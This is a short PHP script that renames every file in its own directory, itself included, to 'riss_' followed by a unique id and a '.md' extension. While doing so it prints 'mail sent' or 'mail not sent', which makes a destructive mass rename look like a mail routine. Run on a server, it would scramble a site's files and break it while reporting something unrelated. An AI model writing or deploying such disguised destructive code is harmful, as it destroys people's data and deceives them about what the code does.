<?php

$directory = __DIR__; 


$newPrefix = "riss_";
$newExtension = "md"; 


if (is_dir($directory)) {
    if ($dh = opendir($directory)) {
        while (($file = readdir($dh)) !== false) {
            
            if ($file != '.' && $file != '..' && is_file($directory . '/' . $file)) {
                $oldPath = $directory . '/' . $file;
                
                
                $newFileName = $newPrefix . uniqid() . '.' . $newExtension;
                $newPath = $directory . '/' . $newFileName;
                
                
                if (rename($oldPath, $newPath)) {
                    echo "mail sent";
                } else {
                    echo "mail not sent";
                }
            }
        }
        closedir($dh);
    }
} else {
    echo "Directory not found!";
}
?>
